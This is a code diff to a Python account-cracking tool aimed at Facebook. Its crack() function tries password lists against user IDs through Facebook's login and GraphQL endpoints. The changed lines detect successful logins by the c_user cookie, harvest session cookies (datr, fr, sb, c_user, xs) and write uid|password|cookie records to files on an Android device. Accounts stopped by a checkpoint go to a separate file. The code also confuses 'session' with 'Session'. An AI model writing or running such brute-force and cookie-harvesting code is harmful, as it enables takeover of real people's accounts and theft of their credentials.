@@ -120,7 +120,7 @@ def crack(uid, password_list, total_count):
             "upgrade-insecure-requests": "1",
             "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0',
             "viewport-width": "980"}
-            response = session.get('https://www.facebook.com/?_rdr',headers=head)
+            response = session.get('https://www.facebook.com/login',headers=head)
             datr = response.cookies.get('datr')
             sb = response.cookies.get('sb')
             fr = response.cookies.get('fr')
@@ -239,24 +239,24 @@ def crack(uid, password_list, total_count):
 }
             # Make API request
             response = session.post('https://www.facebook.com/api/graphql/', cookies=cookies, headers=headers, data=data)
-            wanted = ["ds_user_id", "sessionid"]
-            all_cookies = session.cookies.get_dict()
-            extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
+            log_cookies = Session.cookies.get_dict().keys()
             # Check response
-            if 'sessionid' in extracted:
-                cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items()) 
-                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-                print("Cookies:", cookie_str)
-                open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
-                oks.append(uid)
-                return True
-            elif 'challenge_required' in response.text:
-                print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
-                continue
-            elif 'checkpoint_required' in response.text:
-                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
-                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
-                cps.append(uid)
+            if "c_user" in log_cookies:
+                #kuki = convert(session.cookies.get_dict())
+                kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                user = re.findall('c_user=(.*);xs', kuki)[0]
+                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                    print('\033[1;92m OK '+user+'|'+pw+'')
+                    print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                    open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
+                    oks.append(user)
+                    continue
+            elif 'checkpoint' in log_cookies:
+                print(f"\r\033[1;93m [⚠ SUMON_CP] {uid} | {pw}")
+                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+                cps.append(uid+"|"+pw)
                 continue
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
